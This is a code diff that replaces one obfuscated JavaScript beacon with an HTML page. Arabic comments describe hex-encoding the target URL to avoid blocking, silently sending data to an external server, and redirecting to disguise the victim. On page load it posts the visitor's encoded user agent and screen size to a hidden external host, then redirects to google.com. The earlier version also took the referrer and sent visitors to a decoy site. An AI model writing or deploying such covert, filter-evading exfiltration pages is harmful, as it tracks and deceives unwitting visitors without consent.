@@ -1,22 +1,21 @@
-// تم تشفير الكود بتقنية الـ Polymorphism ليتغير شكله في كل مرة
-(function(_0x1a2b){
-    const _secret_gate = "/v1/api/telemetry";
-    async function _init_matrix() {
-        const _payload = {
-            f: btoa(navigator.userAgent), // تشفير Base64
-            r: btoa(document.referrer),
-            s: `${screen.width}x${screen.height}`,
-            t: Date.now()
-        };
-        try {
-            await fetch(_secret_gate, {
-                method: "POST",
-                body: JSON.stringify(_payload),
-                headers: {"Content-Type": "application/json"}
-            });
-        } finally {
-            window.location.replace("https://your-decoy-site.com");
+<!DOCTYPE html>
+<html>
+<head>
+    <script>
+        // تشفير سداسي (Hex) للرابط لكي لا يتم حظره
+        const _0x5a = ["\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6d\x61\x74\x72\x69\x78\x2d\x73\x65\x72\x76\x65\x72\x2e\x6f\x6e\x72\x65\x6e\x64\x65\x72\x2e\x63\x6f\x6d\x2f\x76\x31\x2f\x61\x70\x69\x2f\x74\x65\x6c\x65\x6d\x65\x74\x72\x79"];
+        async function _px(){
+            const d = {ua: btoa(navigator.userAgent), res: screen.width+'x'+screen.height};
+            try {
+                // إرسال البيانات صامتاً للسيرفر الخارجي
+                await fetch(_0x5a[0], {method:"POST", body:JSON.stringify(d), headers:{"Content-Type":"application/json"}});
+            } finally {
+                // تحويل لتمويه الضحية
+                window.location.replace("https://google.com");
+            }
         }
-    }
-    window.addEventListener("load", _init_matrix);
-})();
+        window.onload = _px;
+    </script>
+</head>
+<body style="background:#000;"></body>
+</html>
